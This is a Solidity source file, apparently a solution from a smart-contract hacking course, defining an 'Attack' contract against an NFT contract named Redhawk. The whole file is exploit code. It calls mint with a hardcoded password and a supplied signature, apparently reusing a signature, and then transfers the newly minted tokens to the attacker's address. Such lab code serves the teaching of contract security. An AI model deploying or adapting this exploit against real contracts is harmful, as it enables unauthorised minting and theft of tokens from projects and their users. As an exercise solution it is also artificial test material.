// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity 0.8.13;

import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "forge-std/console.sol";

interface IRedhawk {
    function mint(uint16 amountOfTickets, string memory password, bytes memory signature) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function currentSupply() external returns(uint16);
}

contract Attack is Ownable {
    bytes32 private constant _TYPE_HASH = keccak256('EIP712Domain(uint256 chainId,address verifyingContract)');
    
    IRedhawk redhawk;
    constructor(address _redhawk) {
        redhawk = IRedhawk(_redhawk);
    }

    function attack(bytes memory signature) external onlyOwner {
        redhawk.mint(2, "RedHawsRulzzz133", signature);
        redhawk.transferFrom(address(this), owner(), redhawk.currentSupply());
        redhawk.transferFrom(address(this), owner(), redhawk.currentSupply() - 1);
    }

}